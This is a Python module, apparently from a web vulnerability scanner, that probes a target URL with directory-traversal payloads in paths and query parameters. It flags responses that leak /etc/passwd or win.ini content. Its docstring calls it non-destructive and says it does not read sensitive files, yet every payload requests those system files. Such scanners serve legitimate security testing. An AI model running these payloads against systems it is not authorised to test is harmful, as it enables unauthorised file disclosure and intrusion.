# path_traversal.py
"""
Basic Path Traversal Tester (safe, non-destructive)

- Tests a set of common traversal payloads against a set of target paths and parameters.
- Uses GET requests only and does NOT attempt to read arbitrary sensitive files directly.
- Looks for strong indicators that traversal occurred (e.g., typical /etc/passwd content like "root:")
  or a significant change in response content that suggests a different file was returned.

Returns:
    List[dict] where each dict contains:
      - Category (str): "Path Traversal"
      - Severity (High/Medium/Low)
      - Description (str)
      - Path (tested URL)
      - Payload (used payload)
      - Status (HTTP status code)
      - Details (optional)
"""

from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, urlencode
import requests
from colorama import Fore, Style

# Common traversal payloads (safe); these are short patterns appended to filenames or params
TRAVERSAL_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "..\\..\\windows\\win.ini", "../..\\..\\etc/passwd",  # mixed slashes sometimes used
    "../../../../../../etc/passwd", "/../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",  # url-encoded
    "../../..//etc/passwd",  # extra slash variants
]

# Common params that sometimes accept filenames/path
COMMON_FILENAME_PARAMS = ["file", "path", "page", "template", "img", "download", "doc", "fileName"]

# Common test paths to try (app home, download endpoints, image endpoints)
COMMON_PATHS = [
    "/", "/download", "/view", "/static", "/images", "/assets", "/file", "/get", "/show"
]

# Indicators that strongly suggest /etc/passwd-like file content
PASSWD_INDICATORS = ["root:", "bin/bash", "sshd:", "/bin/bash"]

# Indicators for Windows INI leakage
WININI_INDICATORS = ["[extensions]", "[fonts]", "for 16-bit app support"]

# Minimum response-length delta relative to baseline that may indicate a different file returned
LENGTH_DELTA_THRESHOLD = 200  # bytes


def _normalize_target(base: str) -> str:
    if not base.startswith("http://") and not base.startswith("https://"):
        return "http://" + base
    return base


def _probe_url(session: requests.Session, url: str, timeout: int = 6, allow_redirects: bool = True) -> Optional[requests.Response]:
    try:
        return session.get(url, timeout=timeout, allow_redirects=allow_redirects)
    except requests.RequestException:
        return None


def test_path_traversal(base_url: str,
                        payloads: Optional[List[str]] = None,
                        paths: Optional[List[str]] = None,
                        params: Optional[List[str]] = None,
                        timeout: int = 6,
                        max_tests: int = 200) -> List[Dict]:
    """
    Run a safe path traversal probe against the target.

    - payloads: list of traversal payloads (default TRAVERSAL_PAYLOADS)
    - paths: list of URL paths to test (default COMMON_PATHS)
    - params: list of parameter names to inject payload into (default COMMON_FILENAME_PARAMS)

    Returns list of findings.
    """
    base = _normalize_target(base_url)
    payloads = payloads or TRAVERSAL_PAYLOADS
    paths = paths or COMMON_PATHS
    params = params or COMMON_FILENAME_PARAMS

    session = requests.Session()
    session.headers.update({"User-Agent": "WebSecScan/PathTraversal/1.0"})

    findings: List[Dict] = []
    tests_run = 0

    # First, collect baseline responses for each path (no payload) to compare sizes/content
    baseline = {}
    for p in paths:
        if tests_run >= max_tests:
            break
        full = urljoin(base, p.lstrip("/"))
        resp = _probe_url(session, full, timeout=timeout)
        baseline[full] = {
            "status": resp.status_code if resp else None,
            "length": len(resp.text) if resp and resp.text is not None else 0,
            "snippet": (resp.text or "")[:500] if resp and resp.text else ""
        }
        tests_run += 1

    # 1) Test payloads appended to path (unsafe file retrieval patterns)
    for p in paths:
        if tests_run >= max_tests:
            break
        base_full = urljoin(base, p.lstrip("/"))
        for payload in payloads:
            if tests_run >= max_tests:
                break
            probe = base_full.rstrip("/") + "/" + payload.lstrip("/")
            resp = _probe_url(session, probe, timeout=timeout)
            tests_run += 1
            if not resp:
                continue

            status = resp.status_code
            text = resp.text or ""
            length = len(text)

            # Strong positive indicators
            if any(ind in text for ind in PASSWD_INDICATORS):
                findings.append({
                    "Category": "Path Traversal",
                    "Severity": "High",
                    "Description": f"Response body appears to contain /etc/passwd indicators for payload '{payload}'.",
                    "Path": probe,
                    "Payload": payload,
                    "Status": status,
                    "Details": "Indicator strings: " + ", ".join([i for i in PASSWD_INDICATORS if i in text])
                })
                continue

            if any(ind in text for ind in WININI_INDICATORS):
                findings.append({
                    "Category": "Path Traversal",
                    "Severity": "High",
                    "Description": f"Response body appears to contain Windows INI-style content for payload '{payload}'.",
                    "Path": probe,
                    "Payload": payload,
                    "Status": status,
                    "Details": "Likely windows config/ini content."
                })
                continue

            # Heuristic: large difference from baseline -> possible different file returned
            base_info = baseline.get(base_full, {})
            base_len = base_info.get("length", 0)
            if base_len and abs(length - base_len) > LENGTH_DELTA_THRESHOLD:
                findings.append({
                    "Category": "Path Traversal",
                    "Severity": "Medium",
                    "Description": f"Response length differs significantly from baseline for payload '{payload}'. Possible file disclosure.",
                    "Path": probe,
                    "Payload": payload,
                    "Status": status,
                    "Details": f"baseline_len={base_len}, found_len={length}"
                })
                continue

    # 2) Test payloads via query parameters (e.g., ?file=../../etc/passwd)
    for p in paths:
        if tests_run >= max_tests:
            break
        base_full = urljoin(base, p.lstrip("/"))
        for param in params:
            if tests_run >= max_tests:
                break
            for payload in payloads:
                if tests_run >= max_tests:
                    break
                q = {param: payload}
                probe = base_full + "?" + urlencode(q)
                resp = _probe_url(session, probe, timeout=timeout)
                tests_run += 1
                if not resp:
                    continue

                status = resp.status_code
                text = resp.text or ""
                length = len(text)

                if any(ind in text for ind in PASSWD_INDICATORS):
                    findings.append({
                        "Category": "Path Traversal",
                        "Severity": "High",
                        "Description": f"Response body appears to contain /etc/passwd indicators for parameter '{param}' payload '{payload}'.",
                        "Path": probe,
                        "Payload": payload,
                        "Status": status,
                        "Details": "Indicator strings: " + ", ".join([i for i in PASSWD_INDICATORS if i in text])
                    })
                    continue

                # Heuristic length delta compared to baseline
                base_info = baseline.get(base_full, {})
                base_len = base_info.get("length", 0)
                if base_len and abs(length - base_len) > LENGTH_DELTA_THRESHOLD:
                    findings.append({
                        "Category": "Path Traversal",
                        "Severity": "Medium",
                        "Description": f"Response length differs significantly from baseline for parameter '{param}' payload '{payload}'. Possible file disclosure.",
                        "Path": probe,
                        "Payload": payload,
                        "Status": status,
                        "Details": f"baseline_len={base_len}, found_len={length}"
                    })
                    continue

    # If no findings, return one informational result
    if not findings:
        findings.append({
            "Category": "Path Traversal",
            "Severity": "Low",
            "Description": "No obvious path traversal indicators found for the tested payloads and paths. This scan is not exhaustive."
        })

    return findings


# CLI demo
if __name__ == "__main__":
    from colorama import init
    init(autoreset=True)
    target = input("Target base URL (e.g., http://127.0.0.1:5000): ").strip()
    print(Fore.CYAN + f"\nRunning basic path traversal probes against {target}" + Style.RESET_ALL)
    res = test_path_traversal(target)
    for i, f in enumerate(res, 1):
        sev_color = {"High": Fore.RED, "Medium": Fore.YELLOW, "Low": Fore.GREEN}.get(f.get("Severity", "Low"), Fore.WHITE)
        print(f"\n{i}. {f.get('Category')} — {sev_color}{f.get('Severity')}{Style.RESET_ALL}")
        print(f"   Description: {f.get('Description')}")
        if f.get("Path"):
            print(f"   Tested URL: {f.get('Path')}")
        if f.get("Payload"):
            print(f"   Payload: {f.get('Payload')}")
        if f.get("Status"):
            print(f"   HTTP Status: {f.get('Status')}")
        if f.get("Details"):
            print(f"   Details: {f.get('Details')}")
